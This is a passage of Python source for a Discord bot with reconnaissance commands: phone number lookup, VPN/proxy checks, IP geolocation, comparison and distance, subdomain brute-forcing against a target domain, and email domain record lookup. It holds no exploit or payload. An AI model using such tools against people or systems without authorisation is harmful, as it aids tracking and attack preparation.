            f"City: {city if city else 'Unknown'}",
            f"State/Region: {state if state else 'Unknown'}",
            f"Carrier: {carrier_name if carrier_name else 'Unknown'}",
            f"Type: {type_map.get(line_type_enum, 'Unknown')}",
            "╚═════════════════════════════════╝"
        ]

    except NumberParseException as e:
        output = [f"Phone lookup error: {e}"]
    except Exception as e:
        output = [f"Unexpected error: {e}"]

    await interaction.edit_original_response(
        content=f"```{chr(10).join(output)}```",
        view=DismissView()
    )

# /vpncheck
@tree.command(name="vpncheck", description="Check if the given IP is a VPN, proxy, or mobile.")
@app_commands.describe(ip="Target IP address")
async def vpncheck(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Checking VPN/Proxy for {ip}...")
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,message,org,proxy,hosting,mobile,isp"
        r = requests.get(url).json()
        if r.get('status') != 'success':
            raise Exception(r.get('message', 'Unknown error'))

        output = f"""
╔═ VPN / PROXY CHECK ═══════════╗
IP: {ip}
ISP: {r.get('isp')}
Org: {r.get('org')}
Proxy/VPN: {'Yes' if r.get('proxy') else 'No'}
Hosting/DC: {'Yes' if r.get('hosting') else 'No'}
Mobile: {'Yes' if r.get('mobile') else 'No'}
╚═══════════════════════════════╝
"""
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error checking IP: {e}")

# /ipcompare
@tree.command(name="ipcompare", description="Compare two IPs for ASN, country, region, and org.")
@app_commands.describe(ip1="First IP", ip2="Second IP")
async def ipcompare(interaction: discord.Interaction, ip1: str, ip2: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Comparing {ip1} and {ip2}...")
    try:
        r1 = requests.get(f"https://ipinfo.io/{ip1}/json").json()
        r2 = requests.get(f"https://ipinfo.io/{ip2}/json").json()

        def safe(val): return val if val else 'N/A'

        output = f"""
╔═ IP COMPARE ═════════════════════════╗
IP 1: {ip1}
IP 2: {ip2}
----------------------------------------
Country : {safe(r1.get('country'))} | {safe(r2.get('country'))}
Region  : {safe(r1.get('region'))}  | {safe(r2.get('region'))}
Org     : {safe(r1.get('org'))}     | {safe(r2.get('org'))}
╚══════════════════════════════════════╝
"""
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error comparing IPs: {e}")

# /ipdistance
@tree.command(name="ipdistance", description="Calculate the distance between two IPs (in km).")
@app_commands.describe(ip1="First IP", ip2="Second IP")
async def ipdistance(interaction: discord.Interaction, ip1: str, ip2: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Calculating distance between {ip1} and {ip2}...")
    try:
        from math import radians, sin, cos, sqrt, atan2

        def haversine(lat1, lon1, lat2, lon2):
            R = 6371.0
            dlat = radians(lat2 - lat1)
            dlon = radians(lon2 - lon1)
            a = sin(dlat / 2)**2 + cos(radians(lat1)) * cos(radians(lat2)) * sin(dlon / 2)**2
            c = 2 * atan2(sqrt(a), sqrt(1 - a))
            return R * c

        r1 = requests.get(f"https://ipinfo.io/{ip1}/json").json()
        r2 = requests.get(f"https://ipinfo.io/{ip2}/json").json()
        loc1 = list(map(float, r1.get("loc", "0,0").split(",")))
        loc2 = list(map(float, r2.get("loc", "0,0").split(",")))
        dist = haversine(loc1[0], loc1[1], loc2[0], loc2[1])
        await interaction.edit_original_response(content=f"Distance between `{ip1}` and `{ip2}` is **{dist:.2f} km**")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error calculating distance: {e}")

# /dnsbrute
@tree.command(name="dnsbrute", description="Brute force subdomains of a domain.")
@app_commands.describe(domain="Target domain to brute subdomains")
async def dnsbrute(interaction: discord.Interaction, domain: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Brute forcing subdomains for {domain}...")
    try:
        import dns.resolver
        wordlist = ['www', 'mail', 'ftp', 'test', 'dev', 'admin', 'api', 'portal', 'blog', 'webmail', 'smtp', 'pop', 'ns1', 'ns2', 'cpanel', 'cdn', 'app', 'vpn', 'beta', 'm', 'mobile', 'stage', 'staging']
        found = []

        for sub in wordlist:
            subdomain = f"{sub}.{domain}"
            try:
                dns.resolver.resolve(subdomain, 'A')
                found.append(subdomain)
            except:
                continue

        if not found:
            await interaction.edit_original_response(content="No subdomains found.")
        else:
            await interaction.edit_original_response(content=f"Found subdomains:\n```" + "\n".join(found) + "```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error during DNS brute force: {e}")

async def progress_message(interaction, msg):
    await interaction.response.send_message(msg)
    return await interaction.original_response()
    
# /dnsbruteip
@tree.command(
    name="dnsbruteip",
    description="Brute force subdomains that resolve to a specific IP.",
)
@app_commands.describe(
    domain="Base domain (e.g. example.com)",
    ip="Target IP to match (optional, leave blank for all)"
)
async def dnsbruteip(interaction: discord.Interaction, domain: str, ip: str = ""):
    if not channel_only(interaction):
        return await interaction.response.send_message(
            "Command restricted to a specific channel.", ephemeral=True
        )

    await progress_message(interaction, f"Brute forcing subdomains for {domain}...")

    wordlist = [
        'www', 'mail', 'ftp', 'test', 'dev', 'admin', 'api', 'portal', 'blog', 'webmail',
        'smtp', 'pop', 'ns1', 'ns2', 'cpanel', 'cdn', 'app', 'vpn', 'beta', 'm', 'mobile',
        'stage', 'staging'
    ]
    found = []

    try:
        for sub in wordlist:
            subdomain = f"{sub}.{domain}"
            try:
                resolved_ip = socket.gethostbyname(subdomain)
                if ip:
                    if resolved_ip == ip:
                        found.append(f"{subdomain} -> {resolved_ip}")
                else:
                    found.append(f"{subdomain} -> {resolved_ip}")
            except socket.gaierror:
                continue

        if found:
            output = f"Found subdomains:\n```" + "\n".join(found) + "```"
            await interaction.edit_original_response(content=output)
        else:
            await interaction.edit_original_response(content="No subdomains found.")

    except Exception as e:
        await interaction.edit_original_response(content=f"Error: {e}")


# /emaillookup
@tree.command(
    name="emaillookup",
    description="Lookup info about an email address (MX, DNS, IP).",
)
@app_commands.describe(email="Email address to lookup")
async def emaillookup(interaction: discord.Interaction, email: str):
    if not channel_only(interaction):
        return await interaction.response.send_message(
            "Command restricted to a specific channel.", ephemeral=True
        )

    await progress_message(interaction, f"Looking up {email}...")

    try:
        local, domain = email.split('@')

        try:
            mx_records = [r.exchange.to_text() for r in dns.resolver.resolve(domain, 'MX')]
        except Exception:
            mx_records = ['No MX records found']

        try:
            a_records = [r.address for r in dns.resolver.resolve(domain, 'A')]
        except Exception:
            a_records = []
        try:
            aaaa_records = [r.address for r in dns.resolver.resolve(domain, 'AAAA')]
        except Exception:
            aaaa_records = []

        all_ips = a_records + aaaa_records

        ptr_records = []
        for ip_addr in all_ips:
            try:
                ptr = socket.gethostbyaddr(ip_addr)[0]
                ptr_records.append(f"{ip_addr} -> {ptr}")
            except Exception:
                ptr_records.append(f"{ip_addr} -> PTR not found")

        output = f"""
╔═ EMAIL LOOKUP ═════════════════════╗
Email: {email}
Domain: {domain}
MX Records: {', '.join(mx_records)}
IP Records: {', '.join(all_ips) if all_ips else 'None'}
PTR Records: {' | '.join(ptr_records) if ptr_records else 'None'}
╚════════════════════════════════════╝
"""

        await interaction.edit_original_response(content=f"```{output}```")

    except Exception as e:
        await interaction.edit_original_response(content=f"Error looking up email: {e}")

# -----------------------------
# RUN BOT
# -----------------------------
bot.run(BOT_TOKEN)
